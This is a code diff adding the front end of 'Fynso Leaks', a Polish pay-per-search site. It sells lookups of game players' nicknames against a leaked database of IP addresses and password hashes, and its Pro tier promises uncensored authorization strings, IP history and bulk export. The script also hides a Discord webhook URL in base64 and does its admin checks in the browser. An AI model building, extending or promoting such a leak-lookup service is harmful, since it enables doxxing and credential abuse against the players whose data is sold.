+    .pw-error { color: var(--danger); font-size: 0.8rem; margin-bottom: 0.5rem; }
+
+    @media (max-width: 600px) {
+      .navbar-brand { font-size: 2.3rem; }
+      .search-box-wrapper { flex-direction: column; gap: 10px; }
+      .search-input { padding: 18px 20px 18px 55px; }
+      .btn-search { position: static; transform: none; width: 100%; margin-top: 5px; }
+      .btn-discord { width: 100%; border-radius: var(--radius-xl); }
+      .cart-wrapper { position: static; margin-bottom: 15px; justify-content: flex-start; }
+      .cart-sidebar { width: 100%; right: -100%; }
+    }
+    /* SCIANA LOGOWANIA */
+    .login-wall {
+      position: fixed;
+      inset: 0;
+      z-index: 99999;
+      background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.7s ease, visibility 0.7s ease;
+    }
+    .login-wall.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+    .login-wall-bg {
+      position: absolute;
+      inset: 0;
+      overflow: hidden;
+    }
+    .login-wall-particle {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.04);
+      animation: lwFloat 10s ease-in-out infinite;
+    }
+    .login-wall-particle:nth-child(1) { width: 300px; height: 300px; top: -80px; left: -80px; animation-delay: 0s; }
+    .login-wall-particle:nth-child(2) { width: 200px; height: 200px; bottom: -50px; right: -50px; animation-delay: -3s; }
+    .login-wall-particle:nth-child(3) { width: 150px; height: 150px; top: 40%; right: 10%; animation-delay: -6s; }
+    .login-wall-particle:nth-child(4) { width: 250px; height: 250px; bottom: 20%; left: 5%; animation-delay: -2s; background: rgba(88,101,242,0.05); }
+    .login-wall-particle:nth-child(5) { width: 180px; height: 180px; top: 15%; left: 20%; animation-delay: -8s; background: rgba(168,85,247,0.04); }
+    .login-wall-card {
+      position: relative;
+      z-index: 1;
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 28px;
+      padding: 3.2rem 2.8rem;
+      text-align: center;
+      max-width: 420px;
+      width: 92%;
+      box-shadow: 0 30px 70px rgba(0,0,0,0.4);
+      animation: lwFadeIn 0.8s ease;
+    }
+    .login-wall-logo {
+      margin-bottom: 1.2rem;
+    }
+    .login-wall-logo svg {
+      width: 88px;
+      height: 66px;
+    }
+    .login-wall-title {
+      color: #fff;
+      font-size: 2rem;
+      font-weight: 900;
+      font-family: 'Cinzel', serif;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      margin-bottom: 0.5rem;
+    }
+    .login-wall-divider {
+      width: 50px;
+      height: 3px;
+      background: #5865F2;
+      border-radius: 10px;
+      margin: 1rem auto;
+    }
+    .login-wall-subtitle {
+      color: rgba(255,255,255,0.55);
+      font-size: 0.9rem;
+      margin-bottom: 2.2rem;
+      line-height: 1.5;
+    }
+    .login-wall-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      padding: 16px 36px;
+      background: #5865F2;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-family: inherit;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      box-shadow: 0 8px 28px rgba(88,101,242,0.35);
+      position: relative;
+      overflow: hidden;
+    }
+    .login-wall-btn::after {
+      content: '';
+      position: absolute;
+      inset: -2px;
+      border-radius: 50px;
+      background: linear-gradient(135deg, #5865F2, #8b9dff, #5865F2);
+      background-size: 200% 200%;
+      z-index: -1;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .login-wall-btn:hover::after {
+      opacity: 1;
+      animation: lwGradientShift 2s ease infinite;
+    }
+    .login-wall-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 14px 40px rgba(88,101,242,0.5);
+      background: #4752C4;
+    }
+    .login-wall-btn:active {
+      transform: translateY(0);
+    }
+    .login-wall-btn svg {
+      width: 22px;
+      height: 22px;
+      fill: currentColor;
+    }
+    .login-wall-footer {
+      color: rgba(255,255,255,0.25);
+      font-size: 0.72rem;
+      margin-top: 2.2rem;
+      letter-spacing: 0.5px;
+    }
+    @keyframes lwFloat {
+      0%, 100% { transform: translateY(0) scale(1); }
+      50% { transform: translateY(-40px) scale(1.15); }
+    }
+    @keyframes lwFadeIn {
+      from { opacity: 0; transform: translateY(30px) scale(0.95); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    @keyframes lwGradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    /* BLOKADA ZAZNACZANIA */
+    body { -webkit-user-select: none; user-select: none; }
+    /* UKRYJ SCROLLBAR NA LOGIN WALL */
+    .login-wall ::-webkit-scrollbar { display: none; }
+  </style>
+</head>
+
+<body>
+
+  <div class="login-wall" id="login-wall">
+    <div class="login-wall-bg">
+      <div class="login-wall-particle"></div>
+      <div class="login-wall-particle"></div>
+      <div class="login-wall-particle"></div>
+      <div class="login-wall-particle"></div>
+      <div class="login-wall-particle"></div>
+    </div>
+    <div class="login-wall-card">
+      <div class="login-wall-logo">
+        <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg"><path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,53.22,6.83,77.19,77.19,0,0,0,49.88,0,105.15,105.15,0,0,0,19.44,8.07C3.66,31.58-1.95,54.65,1,77.53a105.73,105.73,0,0,0,32,16.29,79,79,0,0,0,6.85-11.15,68.7,68.7,0,0,1-10.75-5.13c.91-.66,1.8-1.34,2.65-2a75.58,75.58,0,0,0,70.71,0c.85.69,1.74,1.37,2.65,2a68.44,68.44,0,0,1-10.75,5.13,79.66,79.66,0,0,0,6.85,11.15,105.37,105.37,0,0,0,32-16.29C130.66,47.55,124.71,24.74,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.87,46,53.87,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.11,46,96.11,53,91,65.69,84.69,65.69Z" fill="white"/></svg>
+      </div>
+      <div class="login-wall-title">Fynso Leaks</div>
+      <div class="login-wall-divider"></div>
+      <div class="login-wall-subtitle">Zaloguj się przez Discorda, aby uzyskać dostęp</div>
+      <button class="login-wall-btn" id="login-wall-btn" onclick="startDiscordLogin()">
+        <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg"><path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,53.22,6.83,77.19,77.19,0,0,0,49.88,0,105.15,105.15,0,0,0,19.44,8.07C3.66,31.58-1.95,54.65,1,77.53a105.73,105.73,0,0,0,32,16.29,79,79,0,0,0,6.85-11.15,68.7,68.7,0,0,1-10.75-5.13c.91-.66,1.8-1.34,2.65-2a75.58,75.58,0,0,0,70.71,0c.85.69,1.74,1.37,2.65,2a68.44,68.44,0,0,1-10.75,5.13,79.66,79.66,0,0,0,6.85,11.15,105.37,105.37,0,0,0,32-16.29C130.66,47.55,124.71,24.74,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.87,46,53.87,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.11,46,96.11,53,91,65.69,84.69,65.69Z" fill="white"/></svg>
+        Zaloguj przez Discord
+      </button>
+      <div class="login-wall-footer">© 2026 FYNSO LEAKS — autoryzacja Discord wymagana</div>
+    </div>
+  </div>
+
+  <div class="cursor-glow" id="glow"></div>
+
+  <div class="snow-container">
+    <div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div><div class="snowflake"></div>
+  </div>
+
+  <div class="branch-container">
+    <!-- LEWA STRONA -->
+    <svg class="branch branch-left" viewBox="0 0 500 450" preserveAspectRatio="none" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M-10 -10C70 30 200 15 290 90C320 120 340 180 320 210C300 230 230 200 200 185" stroke="#3D221F" stroke-width="13" stroke-linecap="round"/>
+      <path d="M80 20C140 40 210 30 240 10" stroke="#3D221F" stroke-width="8" stroke-linecap="round"/>
+      <path d="M170 50C230 90 280 80 340 55" stroke="#3D221F" stroke-width="7" stroke-linecap="round"/>
+      <path d="M40 10C80 20 110 60 140 75" stroke="#3D221F" stroke-width="6" stroke-linecap="round"/>
+      <path d="M230 110C280 140 320 130 360 110" stroke="#3D221F" stroke-width="6" stroke-linecap="round"/>
+      <circle cx="290" cy="90" r="28" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="320" cy="210" r="30" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="200" cy="185" r="24" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="240" cy="10" r="26" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="340" cy="55" r="28" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="140" cy="75" r="24" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="360" cy="110" r="26" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="286" cy="86" r="20" fill="#FF97B3"/>
+      <circle cx="324" cy="206" r="22" fill="#FF97B3"/>
+      <circle cx="198" cy="182" r="18" fill="#FF97B3"/>
+      <circle cx="338" cy="52" r="20" fill="#FF97B3"/>
+      <circle cx="284" cy="84" r="14" fill="#FF6B8B"/>
+      <circle cx="326" cy="204" r="15" fill="#FF6B8B"/>
+      <circle cx="305" cy="70" r="25" fill="#FFB7C5"/>
+      <circle cx="335" cy="160" r="26" fill="#FFB7C5"/>
+      <circle cx="260" cy="25" r="24" fill="#FF97B3"/>
+      <circle cx="100" cy="25" r="20" fill="#FFB7C5"/>
+      <circle cx="150" cy="35" r="22" fill="#FF97B3"/>
+    </svg>
+    <!-- PRAWA STRONA -->
+    <svg class="branch branch-right" viewBox="0 0 500 450" preserveAspectRatio="none" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M510 -10C440 30 310 15 220 90C190 120 170 180 190 210C210 230 280 200 310 185" stroke="#3D221F" stroke-width="13" stroke-linecap="round"/>
+      <path d="M430 20C390 40 320 30 290 10" stroke="#3D221F" stroke-width="8" stroke-linecap="round"/>
+      <path d="M330 50C270 90 220 80 160 55" stroke="#3D221F" stroke-width="7" stroke-linecap="round"/>
+      <path d="M460 10C420 20 390 60 360 75" stroke="#3D221F" stroke-width="6" stroke-linecap="round"/>
+      <path d="M270 110C220 140 180 130 140 110" stroke="#3D221F" stroke-width="6" stroke-linecap="round"/>
+      <circle cx="210" cy="90" r="28" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="180" cy="210" r="30" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="300" cy="185" r="24" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="260" cy="10" r="26" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="160" cy="55" r="28" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="360" cy="75" r="24" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="140" cy="110" r="26" fill="#FFB7C5" opacity="0.95"/>
+      <circle cx="214" cy="86" r="20" fill="#FF97B3"/>
+      <circle cx="176" cy="206" r="22" fill="#FF97B3"/>
+      <circle cx="302" cy="182" r="18" fill="#FF97B3"/>
+      <circle cx="162" cy="52" r="20" fill="#FF97B3"/>
+      <circle cx="216" cy="84" r="14" fill="#FF6B8B"/>
+      <circle cx="174" cy="204" r="15" fill="#FF6B8B"/>
+      <circle cx="195" cy="70" r="25" fill="#FFB7C5"/>
+      <circle cx="165" cy="160" r="26" fill="#FFB7C5"/>
+      <circle cx="240" cy="25" r="24" fill="#FF97B3"/>
+      <circle cx="400" cy="25" r="20" fill="#FFB7C5"/>
+      <circle cx="350" cy="35" r="22" fill="#FF97B3"/>
+    </svg>
+  </div>
+
+  <div class="admin-control-panel" id="admin-control-panel">
+    <div class="admin-panel-title">Panel licencji</div>
+    <div class="admin-panel-box">
+      <div class="admin-profile-row">
+        <img id="admin-profile-avatar" class="admin-profile-avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="avatar" />
+        <div class="admin-profile-name">
+          <strong id="admin-profile-name">Brak logowania</strong>
+          <span id="admin-profile-status">Zaloguj się Discord, aby aktywować</span>
+        </div>
+      </div>
+      <div class="admin-plan-label" id="admin-current-plan">Plan: BRAK</div>
+      <div class="admin-slider-group">
+        <div class="admin-slider-info">
+          <strong id="admin-selected-plan-label">Free</strong>
+          <span>Przeciągnij suwak, aby wybrać plan</span>
+        </div>
+        <div class="admin-slider-wrap">
+          <input id="admin-plan-slider" class="admin-slider" type="range" min="0" max="2" value="0" step="1" onchange="updateSelectedPlan()" />
+        </div>
+      </div>
+      <div class="admin-panel-actions">
+        <button class="admin-btn-set" onclick="assignPlanToCurrentUser()">Nadaj licencję</button>
+        <button class="admin-btn-remove" onclick="removeCurrentUserLicense()">Usuń licencję</button>
+      </div>
+      <div id="admin-control-user-list" class="admin-control-user-list">
+        <div class="admin-control-empty">Tylko administratorzy widzą listę zarejestrowanych użytkowników.</div>
+      </div>
+      <div style="font-size:0.82rem; color:#555;">Ustawienia działają dla zalogowanego konta. Gdy nie jesteś zalogowany, panel podpowiada jak się połączyć.</div>
+    </div>
+  </div>
+
+  <div class="cart-sidebar" id="cart-sidebar">
+    <div class="cart-sidebar-header">
+      <div class="cart-sidebar-title">Koszyk</div>
+      <button class="btn-close-cart" onclick="toggleCart(false)" aria-label="Zamknij koszyk">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <line x1="18" y1="6" x2="6" y2="18" stroke-linecap="round" />
+          <line x1="6" y1="6" x2="18" y2="18" stroke-linecap="round" />
+        </svg>
+      </button>
+    </div>
+    <div class="cart-sidebar-content" id="cart-items-container">
+      <div class="cart-empty-msg">Koszyk jest obecnie pusty.</div>
+    </div>
+    <div class="cart-sidebar-footer" id="cart-footer" style="display: none;">
+      <div class="cart-total-row">
+        <span>Suma:</span>
+        <span id="cart-total-price">0 ZŁ</span>
+      </div>
+      <p style="text-align:center;font-size:14px;color:#666;margin-bottom:15px;">Po dokonaniu wpłaty podaj swojego Discorda w opisie płatności lub otwórz ticket na Discordzie.</p>
+      <button class="btn-checkout" onclick="window.open('https://discord.gg/YYnBytuzXR', '_blank')">Kup teraz</button>
+    </div>
+  </div>
+
+  <div class="pw-overlay hidden" id="pw-overlay">
+    <div class="pw-box">
+      <div id="pw-title" style="font-weight:700; margin-bottom:0.5rem;">Panel zabezpieczony</div>
+      <input type="password" id="pw-input" class="pw-input" onkeydown="pwKeydown(event)" />
+      <div class="pw-error" id="pw-error"></div>
+      <div class="pw-actions">
+        <button class="pw-btn-cancel" onclick="pwCancel()">Wróć</button>
+        <button class="pw-btn-ok" onclick="pwConfirm()">Potwierdź</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="main">
+    <section id="view-search" class="view active">
+      
+      <div class="search-hero">
+        <!-- KOSZYK ZAKUPOWY - Z LEWEJ STRONY -->
+        <div class="cart-wrapper">
+          <button class="btn-cart" onclick="toggleCart(true)" title="Otwórz koszyk">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 3h1.386c.51 0 .955.343 1.087.835l.383 1.437M7.5 14.25a3 3 0 00-3 3h15.75m-12.75-3h11.218c1.121-2.3 2.1-4.684 2.924-7.138a60.114 60.114 0 00-16.536-1.84M7.5 14.25L5.106 5.272M6 20.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm12.75 0a.75.75 0 11-1.5 0 .75.75 0 011.5 0z" />
+            </svg>
+            <span class="cart-count" id="cart-count">0</span>
+          </button>
+        </div>
+
+        <div class="search-box-wrapper">
+          <div class="search-input-container">
+            <svg class="search-field-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+            </svg>
+            <input type="text" id="search-input" class="search-input" placeholder="Wpisz nick Gracza" autocomplete="off" spellcheck="false" onkeydown="handleSearchKey(event)" />
+            <button class="btn-search" onclick="performSearch()">Szukaj</button>
+          </div>
+
+          <button class="btn-discord" onclick="window.open('https://dc.gg/fynzoleaks', '_blank')" title="Dołącz do Discorda">
+            <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg"><path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,53.22,6.83,77.19,77.19,0,0,0,49.88,0,105.15,105.15,0,0,0,19.44,8.07C3.66,31.58-1.95,54.65,1,77.53a105.73,105.73,0,0,0,32,16.29,79,79,0,0,0,6.85-11.15,68.7,68.7,0,0,1-10.75-5.13c.91-.66,1.8-1.34,2.65-2a75.58,75.58,0,0,0,70.71,0c.85.69,1.74,1.37,2.65,2a68.44,68.44,0,0,1-10.75,5.13,79.66,79.66,0,0,0,6.85,11.15,105.37,105.37,0,0,0,32-16.29C130.66,47.55,124.71,24.74,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.87,46,53.87,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.11,46,96.11,53,91,65.69,84.69,65.69Z"/></svg>
+          </button>
+        </div>
+        <div class="discord-auth-card">
+          <button id="discord-auth-button" class="btn-discord-auth" onclick="startDiscordLogin()" type="button">
+            <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg"><path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,53.22,6.83,77.19,77.19,0,0,0,49.88,0,105.15,105.15,0,0,0,19.44,8.07C3.66,31.58-1.95,54.65,1,77.53a105.73,105.73,0,0,0,32,16.29,79,79,0,0,0,6.85-11.15,68.7,68.7,0,0,1-10.75-5.13c.91-.66,1.8-1.34,2.65-2a75.58,75.58,0,0,0,70.71,0c.85.69,1.74,1.37,2.65,2a68.44,68.44,0,0,1-10.75,5.13,79.66,79.66,0,0,0,6.85,11.15,105.37,105.37,0,0,0,32-16.29C130.66,47.55,124.71,24.74,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.87,46,53.87,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.11,46,96.11,53,91,65.69,84.69,65.69Z"/></svg>
+            Zaloguj przez Discord
+          </button>
+          <div id="discord-user-card" class="discord-user-card hidden"></div>
+        </div>
+        <div class="search-subtitle">Wyszukiwanie użytkowników</div>
+        <div id="search-license-info" class="license-info">Musisz się zalogować Discord, aby skorzystać z wyszukiwania.</div>
+      </div>
+
+      <div class="result-section" id="result-area"></div>
+
+      <section id="view-admin" class="view">
+        <div class="card admin-panel-card">
+          <div class="admin-panel-header">
+            <div>
+              <h3>Panel administratora</h3>
+              <p>Lista użytkowników zalogowanych przez Discord oraz ich status.</p>
+            </div>
+            <span class="admin-badge">Admin</span>
+          </div>
+          <div class="admin-panel-actions">
+            <button class="btn-primary" onclick="refreshAdminPanel()">Odśwież</button>
+            <button class="btn-danger" onclick="clearAdminUsers()">Wyczyść listę</button>
+          </div>
+          <div id="admin-user-list" class="admin-user-list"></div>
+        </div>
+      </section>
+
+      <h2 class="pricing-title">Dostępne pakiety wyszukiwań</h2>
+      <div class="pricing-container">
+        
+        <!-- PAKIET FREE -->
+        <div class="price-card">
+          <span class="price-badge active-badge">W UŻYCIU</span>
+          <div class="price-name">Free</div>
+          <div class="price-cost">0 ZŁ<span>/mc</span></div>
+          <ul class="price-features">
+            <li>Dzienny limit wyszukiwań: <strong>5 UŻYĆ DZIENNIE</strong></li>
+            <li>Podstawowa prędkość odpytywania bazy danych</li>
+            <li>Dostęp do publicznych wpisów indeksu</li>
+            <li>Standardowy czas oczekiwania na żądania</li>
+            <li>Wsparcie społecznościowe na forum</li>
+            <li>Reklamy wewnątrz interfejsu wyszukiwarki</li>
+          </ul>
+          <button class="btn-price" disabled style="cursor:not-allowed; opacity:0.7;">Aktywny</button>
+        </div>
+
+        <!-- PAKIET MEDIUM -->
+        <div class="price-card featured">
+          <span class="price-badge" style="background:var(--accent); color:white;">POLECANY</span>
+          <div class="price-name">Medium</div>
+          <div class="price-cost">15 ZŁ<span>/mc</span></div>
+          <ul class="price-features">
+            <li>Zwiększony limit zapytań: <strong>50 UŻYĆ DZIENNIE</strong></li>
+            <li>Brak jakichkolwiek opóźnień między zapytaniami</li>
+            <li>Dostęp do zaawansowanych rekordów i hashów</li>
+            <li>Priorytetowe przetwarzanie w chmurze skryptu</li>
+            <li>Całkowity brak reklam na stronie</li>
+            <li>Dedykowana sekcja wsparcia technicznego</li>
+            <li>Wgląd w historię zmian adresów sieciowych</li>
+          </ul>
+          <button class="btn-price" onclick="addToCart('Medium', 15)">Wybierz</button>
+        </div>
+
+        <!-- PAKIET PRO -->
+        <div class="price-card">
+          <span class="price-badge">BEZ LIMITÓW</span>
+          <div class="price-name">Pro</div>
+          <div class="price-cost">35 ZŁ<span>/mc</span></div>
+          <ul class="price-features">
+            <li>Nielimitowany dostęp: <strong>INFINITY</strong></li>
+            <li>Błyskawiczne sprawdzanie całego indeksu globalnego</li>
+            <li>Kompletne i nieocenzurowane ciągi autoryzacyjne</li>
+            <li>Dostęp do API dla zewnętrznych integracji</li>
+            <li>Eksport baz danych do plików zewnętrznych</li>
+            <li>Dostęp do ukrytych logów developerskich</li>
+            <li>Indywidualne wsparcie 24/7 od administratorów</li>
+            <li>Możliwość monitorowania zmian w czasie rzeczywistym</li>
+          </ul>
+          <button class="btn-price" onclick="addToCart('Pro', 35)">Wybierz</button>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Sekcja importu pominięta w widoku domyślnym dla zachowania integralności kodu -->
+    <section id="view-import" class="view">
+      <div class="card">
+        <h3 style="margin-bottom:1rem; text-transform:uppercase; font-size:1.1rem;">Baza danych skryptu</h3>
+        <textarea id="import-textarea" class="import-textarea" placeholder="Nick;IP;Hash"></textarea>
+        <div class="import-actions">
+          <button class="btn-primary" onclick="loadData()">Załaduj strukturę</button>
+          <button class="btn-primary" onclick="loadHasherData()">Załaduj z hasher.html</button>
+          <button class="btn-danger" onclick="clearData()">Wyczyść bazę</button>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    © 2026 FYNSO LEAKS - ALL RIGHTS RESERVED
+  </footer>
+
+  <div class="toast" id="toast"><span id="toast-msg"></span></div>
+
+  <script>
+    var glow = document.getElementById('glow');
+    window.addEventListener('mousemove', function(e) {
+      glow.style.display = 'block';
+      glow.style.left = e.clientX + 'px';
+      glow.style.top = e.clientY + 'px';
+    });
+    window.addEventListener('mouseleave', function() { glow.style.display = 'none'; });
+
+    var db = {};
+    var adminUnlocked = false;
+    var cart = [];
+    var adminDiscordId = '1480293263826092062';
+    var discordWebhookUrl = (function(){var a='aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1Mjg3NTgyOTAxOTUxNTcxMDQvVTJIMDZyMXllS2k0QnM0VnpTMTFZaTI1T19xREVIVUhvRG5IQjNadkpkWU1lV0QwS0dXYWxQTWpxTUFGeWxqSHFMbw==';try{return atob(a)}catch(e){return ''}})();
+    var discordConfig = {
+      clientId: '1528820555028107285',
+      redirectUri: 'https://kitsuneeo.github.io/fysno-leaks/',
+      scopes: 'identify guilds.join'
+    };
+    var discordGuildId = '1358660597360627802';
+    var planLimits = { free: 5, medium: 50, pro: Infinity };
+    var planOptions = ['free', 'medium', 'pro'];
+    var planDisplayNames = { free: 'Free', medium: 'Medium', pro: 'Pro' };
+
+    function normalizeDate(date) {
+      return new Date(date).toDateString();
+    }
+
+    function getUserRecord(profile) {
+      if (!profile) return null;
+      var users = getAdminUsers();
+      var existing = users.find(function(user) { return String(user.id) === String(profile.id); });
+      if (!existing) {
+        existing = {
+          id: profile.id,
+          username: profile.username,
+          avatar: profile.avatar || '',
+          plan: 'free',
+          status: 'active',
+          searchesToday: 0,
+          lastReset: normalizeDate(new Date()),
+          joinedAt: new Date().toISOString(),
+          updatedAt: new Date().toISOString()
+        };
+        users.push(existing);
+        saveAdminUsers(users);
+      }
+      existing.username = profile.username;
+      existing.avatar = profile.avatar || '';
+      existing.updatedAt = new Date().toISOString();
+      if (!existing.plan || existing.plan === 'pending') {
+        existing.plan = 'free';
+      }
+      if (!existing.status || existing.status === 'pending') {
+        existing.status = 'active';
+      }
+      resetUserQuota(existing);
+      saveAdminUsers(users);
+      return existing;
+    }
+
+    function saveUserRecord(user) {
+      if (!user) return;
+      var users = getAdminUsers();
+      var index = users.findIndex(function(item) { return String(item.id) === String(user.id); });
+      if (index >= 0) {
+        users[index] = user;
+      } else {
+        users.push(user);
+      }
+      saveAdminUsers(users);
+      refreshAdminControlPanel();
+      refreshAdminPanel();
+    }
+
+    function resetUserQuota(user) {
+      var today = normalizeDate(new Date());
+      if (user.lastReset !== today) {
+        user.lastReset = today;
+        user.searchesToday = 0;
+      }
+    }
+
+    function getAvailableSearches(user) {
+      if (!user || !user.plan || user.plan === 'pending') return 0;
+      if (user.plan === 'pro') return Infinity;
+      return Math.max(0, planLimits[user.plan] - (user.searchesToday || 0));
+    }
+
+    function canSearch(user) {
+      if (!user || user.plan === 'pending') return false;
+      if (user.plan === 'pro') return true;
+      return getAvailableSearches(user) > 0;
+    }
+
+    function generateRandomString(length) {
+      var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      var result = '';
+      for (var i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    async function generateCodeChallenge(verifier) {
+      var encoder = new TextEncoder();
+      var data = encoder.encode(verifier);
+      var digest = await crypto.subtle.digest('SHA-256', data);
+      return btoa(String.fromCharCode.apply(null, new Uint8Array(digest)))
+        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
+    }
+
+    function getSavedDiscordProfile() {
+      try {
+        return JSON.parse(localStorage.getItem('discord-user-profile') || 'null');
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function isAdminProfile(profile) {
+      return !!(profile && String(profile.id) === adminDiscordId);
+    }
+
+    function getAdminUsers() {
+      try {
+        return JSON.parse(localStorage.getItem('discord-admin-users') || '[]');
+      } catch (e) {
+        return [];
+      }
+    }
+
+    function saveAdminUsers(users) {
+      localStorage.setItem('discord-admin-users', JSON.stringify(users));
+    }
+
+    function ensureAdminUser(profile) {
+      if (!profile) return;
+      var user = getUserRecord(profile);
+      if (!user.plan || user.plan === 'pending') {
+        user.plan = 'free';
+      }
+      if (!user.status || user.status === 'pending') {
+        user.status = 'active';
+      }
+      saveUserRecord(user);
+    }
+
+    function updateUserStatus(userId, status) {
+      var users = getAdminUsers();
+      users = users.map(function(user) {
+        if (String(user.id) === String(userId)) {
+          user.status = status;
+          user.updatedAt = new Date().toISOString();
+        }
+        return user;
+      });
+      saveAdminUsers(users);
+      refreshAdminPanel();
+      showToast('Status użytkownika zaktualizowany.');
+    }
+
+    function assignUserPlan(userId, plan) {
+      var profile = getSavedDiscordProfile();
+      if (!profile || !isAdminProfile(profile)) {
+        showToast('Tylko administrator może zmieniać plany użytkowników.');
+        return;
+      }
+      var users = getAdminUsers();
+      users = users.map(function(user) {
+        if (String(user.id) === String(userId)) {
+          user.plan = plan;
+          user.status = 'active';
+          user.updatedAt = new Date().toISOString();
+          if (!user.lastReset) {
+            user.lastReset = normalizeDate(new Date());
+          }
+          if (typeof user.searchesToday !== 'number') {
+            user.searchesToday = 0;
+          }
+          sendDiscordWebhook('🔧 Plan użytkownika **' + user.username + '** (ID: ' + user.id + ') został zmieniony na **' + plan.toUpperCase() + '** przez administratora.');
+        }
+        return user;
+      });
+      saveAdminUsers(users);
+      refreshAdminPanel();
+      refreshAdminControlPanel();
+      showToast('Plan użytkownika zmieniony na ' + plan + '.');
+    }
+
+    function clearAdminUsers() {
+      localStorage.removeItem('discord-admin-users');
+      refreshAdminPanel();
+      showToast('Lista użytkowników została wyczyszczona.');
+    }
+
+    function addCurrentProfileToUsers() {
+      var profile = getSavedDiscordProfile();
+      if (!profile) {
+        showToast('Najpierw zaloguj się przez Discord.');
+        return;
+      }
+      ensureAdminUser(profile);
+      refreshAdminPanel();
+      showToast('Twój profil został dodany do listy użytkowników.');
+    }
+
+    function refreshAdminPanel() {
+      var profile = getSavedDiscordProfile();
+      var list = document.getElementById('admin-user-list');
+      var adminNav = document.getElementById('admin-nav-item');
+      var adminSection = document.getElementById('view-admin');
+      if (!isAdminProfile(profile)) {
+        if (adminNav) adminNav.style.display = 'none';
+        if (adminSection) adminSection.style.display = 'none';
